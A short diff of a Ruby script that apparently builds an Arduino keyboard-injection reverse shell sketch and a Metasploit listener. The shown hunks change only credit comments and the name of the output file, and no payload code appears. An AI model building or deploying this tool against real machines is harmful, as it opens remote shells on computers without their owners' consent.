@@ -1,5 +1,9 @@
 #!/usr/bin/env ruby
-# Code aangepast voor Termux door ChatGPT
+# Thanks to @mattifestation exploit-monday.com and Dave Kennedy.
+# Works for Arduino Leonardo and others
+# Code By @Sirage7474
+# https://github.com/Sirage7474/Reverse-Shell-Arduino
+
 require 'base64'
 require 'readline'
 
@@ -100,8 +104,8 @@ def arduino_setup(host)
     }
     void loop() {}
   SKETCH
-  File.write("reverse_shell_arduino.txt", s)
-  print_success("Arduino sketch saved to reverse_shell_arduino.txt")
+  File.write("reverse_shell_arduino_termux.txt", s)
+  print_success("Arduino sketch saved to reverse_shell_arduino_termux.txt")
 end
 
 def metasploit_setup(msf_path, host, port)
